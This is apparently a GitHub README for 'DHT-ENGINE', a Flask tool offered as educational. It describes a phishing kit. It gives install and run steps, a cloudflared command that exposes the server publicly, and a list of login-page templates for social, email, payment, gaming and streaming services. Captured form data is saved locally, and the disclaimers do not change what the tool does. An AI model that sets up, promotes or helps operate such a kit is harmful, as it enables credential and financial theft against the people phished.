# DHT-ENGINE 🛠️

![DHT-HACKERS](https://img.shields.io/badge/DHT-HACKERS-magenta?style=for-the-badge) 

![DHT-GHOST](https://img.shields.io/badge/DHT-GHOST-magenta?style=for-the-badge)

Welcome to **DHT-ENGINE**, an educational Python-based web framework designed for learning Flask, threading, and real-time web interaction. This project demonstrates dynamic web forms, multi-step input handling, and terminal output with **Rich** tables and panels.

> ⚠️ **Disclaimer:** This project is for **educational purposes only**. Do not use it to collect real credentials or attack systems. Use only in local environments or sandboxed networks.

---

# Table of Contents 📑

- [Features](#features-⏩)  
- [Prerequisites](#prerequisites)  
- [Installation](#installation-⛏️)  
- [Usage](#usage-🧾)  
- [Supported Platforms](#supported-platforms-🖥️)  
- [Credits](#credits-💳)  

---

# Features ⏩

- Multi-platform template support  
- Real-time terminal output with `rich`  
- Multi-step form capture simulation  
- Terminal banners & UI with `pyfiglet` and `colorama`  
- Background tasks demo with threading  
- Optional local tunneling via `cloudflared`  

---

# Prerequisites

- Python 3.8+  
- pip (Python package manager)  
- Git (optional for cloning)  
- Cloudflared (optional, for local tunneling)  

---

# Installation ⛏️

## Termux
```bash
pkg update && pkg upgrade -y  
pkg install python git cloudflared -y  
git clone https://github.com/DHThackers-10/DHT-ENGINE  
cd DHT-ENGINE  
pip install Flask colorama rich pyfiglet  
```
## Linux (Ubuntu/Debian)
```bash
sudo apt update && sudo apt upgrade -y  
sudo apt install -y python3 python3-pip git cloudflared  
git clone https://github.com/DHThackers-10/DHT-ENGINE  
cd DHT-ENGINE  
python3 -m venv venv  
source venv/bin/activate   
pip install Flask colorama rich pyfiglet  
```
## Kali Linux
```bash
sudo apt update && sudo apt upgrade -y  
sudo apt install -y python3 python3-pip git cloudflared  
git clone https://github.com/DHThackers-10/DHT-ENGINE  
cd DHT-ENGINE  
python3 -m venv venv  
source venv/bin/activate  
pip install Flask colorama rich pyfiglet  
```
---

# Usage 🧾

1. Run the engine:
```bash
python DHT-ENGINE.py
```
2. Terminal Banner: Shows a styled DHT banner.

3. Select Platform: Pick a platform from the terminal list.

4. Flask Server: Starts locally at:

http://127.0.0.1:5000

5. Optional Cloudflare Tunnel: To expose server externally:

cloudflared tunnel --url http://127.0.0.1:5000

6. View Data: Submitted form data is displayed in terminal tables and saved locally in collected_data.json.

---

# Screenshots
![Screenshot_20250912-165720](https://github.com/user-attachments/assets/74d19b6e-3547-4321-9457-ec9b7d30290c)
![Screenshot_20250912-165731](https://github.com/user-attachments/assets/740c6975-9b2d-47d2-bc6f-70ca0243b975)
![Screenshot_20250912-165928](https://github.com/user-attachments/assets/94c7c9fd-67b8-43a7-99d1-a72c2159760d)
![Screenshot_20250912-165939](https://github.com/user-attachments/assets/dde4e55e-688f-4844-9cfe-9d6165ce7380)


# Supported Platforms 🖥️

Social: Facebook, Instagram, Twitter, Snapchat, TikTok, LinkedIn, Reddit, Quora, Pinterest  
Messaging: Telegram, WhatsApp, Messenger, Discord, Signal, Viber, Skype, Line, Kik 

Email: Gmail, Yahoo Mail, Outlook, ProtonMail, Zoho Mail, iCloud Mail, GMX, Yandex, Mail.com  

Payments: PayPal, Paytm, Google Pay, PhonePe, Easypaisa, JazzCash, Venmo, Cash App, Stripe, Skrill, Neteller 

Gaming: PUBG Mobile, FreeFire, Fortnite, Steam, Roblox, Minecraft, Valorant, Apex Legends, Call of Duty, Epic Games  

Streaming: Netflix, Hulu, Disney+, Twitch, YouTube, Spotify, Apple Music, SoundCloud, Hotstar, Voot 

Others: GitHub, GitLab, Stack Overflow, Notion, Wordpress, Slack, Zoom, Google Drive, Dropbox, OneDrive  

> **⚠️ Note:** For educational and testing purposes only. Do not use real accounts.

---

# Credits 💳

**DHT-GHOST:** THE KING OF DIGITAL WORLD

**DHT-HACKERS Team:** Core development and maintenance 

**YouTube Channel:** Tutorials & guides — [DHT-HACKERS](https://www.youtube.com/@DHT-HACKERS_10)

**Community:** DHT-HACKERS discussion & learning — [WhatsApp Group](https://chat.whatsapp.com/G2hCkCzylra2OENEfhH8Os)

---

# Greetings 🤗

Special thanks to the open-source community and everyone supporting ethical hacking and cybersecurity learning!
# HCO-ENGINE
